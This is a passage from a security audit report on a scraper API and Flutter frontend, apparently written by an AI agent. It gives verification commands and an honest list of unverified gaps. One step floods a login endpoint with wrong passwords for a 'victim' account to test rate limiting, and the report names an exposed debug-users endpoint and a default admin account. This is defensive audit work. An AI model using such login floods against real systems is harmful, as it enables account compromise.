    -d '{"username":"victim","password":"wrong"}'
done; echo
#   must reach 429 well before attempt 15
kill %1

# -- 7. H-4: webhook replay must be idempotent, not 400 -------------------
python -m pytest tests/test_webhook_idempotency.py -v      # once written

# -- 8. C-2 / H-7: clean-clone build must have no creds and real templates -
cd /tmp && rm -rf audit-clone
git clone --depth 1 file://F:/webTest/scraper/business_scraper_api audit-clone
cd audit-clone
grep -rn "tool.com\|akb@" --include='*.py' --include='*.md' --include='*.yml' . ; echo "exit=$?"
#   must print nothing (exit=1)
ls backend/notifications/templates/*.html
#   must list 6 files

# -- 9. Frontend ----------------------------------------------------------
cd ../../frontend
flutter analyze
flutter test
flutter build web --release --pwa-strategy=none --dart-define=API_URL=http://localhost:8001

# -- 10. Dependency hygiene -----------------------------------------------
cd ../backend && pip install pip-audit && pip-audit -r requirements.txt
cd ../frontend && dart pub outdated
```

---

## 9. Gaps in This Audit

**Nothing in this report was verified at runtime.** The sandbox denied every execution attempt � `python -m pytest tests/`, `python -c "import sqlite3..."`, and several `git` invocations (`git log -- <path>`, `git cat-file`, `git status --porcelain`, `git ls-files | grep`). The backend was never started. Specifically unverified:

1. **Test suite status.** I do not know whether `backend/tests/` passes, fails, or errors on import. The M-3 analysis predicts it either mutates the real `scraper.db` or raises `IndexError` � neither outcome was observed.
2. **HYP-1 (SQLite `UPDATE � ORDER BY LIMIT`).** Build-dependent; one command settles it.
3. **HYP-4 (migration 009 transaction nesting).** Requires a clean `init_database()` run.
4. **MySQL behaviour (H-9).** The SQL-dialect errors are read from source, not observed. No MySQL instance was reachable.
5. **`scraper.db` history.** Confirmed tracked via `git ls-files`; currently 0 bytes. Historical blob sizes and contents are **unknown** � `git log -- scraper.db` and `git cat-file -s` were blocked. Treat as potentially containing real data until checked.
6. **Live deployment state.** I could not determine which `vercel.json` is authoritative (HYP-5), whether `DISABLE_DEFAULT_ADMIN` is actually set in production, or whether `SECRET_KEY` is configured. The `/internal/debug_users` and default-admin findings are *code-confirmed* but their *live exploitability* depends on environment variables I deliberately did not read.
7. **`backend/.env` contents.** Not read, per your instruction. Its existence is confirmed; it is correctly gitignored (`.gitignore:71`) and correctly excluded from Docker builds (`.dockerignore:1`) � though `docker-compose.yml:19` bind-mounts it into the container anyway.
8. **Tracked status of three files.** `docker-compose.local.yml`, `frontend/Dockerfile.local`, and `frontend/nginx.local.conf` do not appear in the `git ls-files` listing I captured, but the session-start `git status` snapshot showed only two untracked files. I could not re-run the targeted git query to resolve the discrepancy. The H-7 claim about `backend/notifications/templates/*.html` is **not** affected � that one is confirmed from the complete 371-entry file listing plus `.gitignore:92`.
9. **Flutter web build (HYP-2).** No `flutter analyze` or `flutter build web` was run; the `dart:io` concern is unresolved.
10. **Runtime concurrency behaviour.** M-1 (credit race), HYP-3 (MySQL pool), and the `BackgroundTasks` memory profile are all reasoned from source. None was load-tested.

None of the Confirmed findings in �3 depends on these gaps � each is supported by the quoted source. The gaps affect *severity calibration* and the hypotheses in �4, not the existence of the defects.
